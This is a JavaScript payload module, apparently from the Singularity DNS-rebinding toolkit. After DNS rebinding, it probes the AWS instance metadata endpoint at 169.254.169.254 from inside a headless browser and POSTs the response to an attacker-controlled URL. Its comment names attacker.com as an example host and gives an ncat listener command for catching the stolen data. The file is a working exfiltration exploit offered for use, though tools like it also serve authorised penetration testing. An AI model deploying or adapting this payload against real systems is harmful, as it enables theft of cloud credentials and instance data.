/**
This is a sample payload to make a GET request to a AWS metadata endpoint and exfiltrate the response.
This is a useful in the context of a service wrapping a headless browser such as Google Chrome and when
the output of the browser is not shown to the attacker.

Replace `EXFILTRATION_URL` with the host and path to exfiltrate data e.g. http://attacker.com:8000/
Change `begin('/latest/meta-data/')` as appropriate to exfiltrate the desired data e.g. `/latest/meta-data/`...

Run a tool such as `ncat` e.g. `ncat -lkv 8000` on the attacker host to capture the exfiltrated data.
Use TLS if you want to protect the exfiltrated data in transit.

Run the Singularity server e.g
`./singularity-server -HTTPServerPort 80`
**/

const AwsMetadataExfil = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        if (headers !== null) {
            console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
        };
        if (cookie !== null) {
            console.log(`Origin: ${window.location} headers: ${cookie}`);
        };
        if (body !== null) {
            console.log(`Origin: ${window.location} body:\n${body}`);
        };

        let EXFILTRATION_URL = "http://xxxx.xxx:xxxxx/";
        fetch(EXFILTRATION_URL, {
            method: 'POST',
            mode: "no-cors",
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
            },
            body: body
        });

    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        let controller = new AbortController(); //NO IE support
        let signal = controller.signal;
        return timeout(1000, fetch(`http://169.254.169.254/latest/meta-data/`, {
            mode: 'no-cors',
            credentials: 'omit',
            signal
        }), controller)
            .then(response => {
                return true;
            })
            .catch(e => { return (false); })
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["AWS Metadata Exfil"] = AwsMetadataExfil();

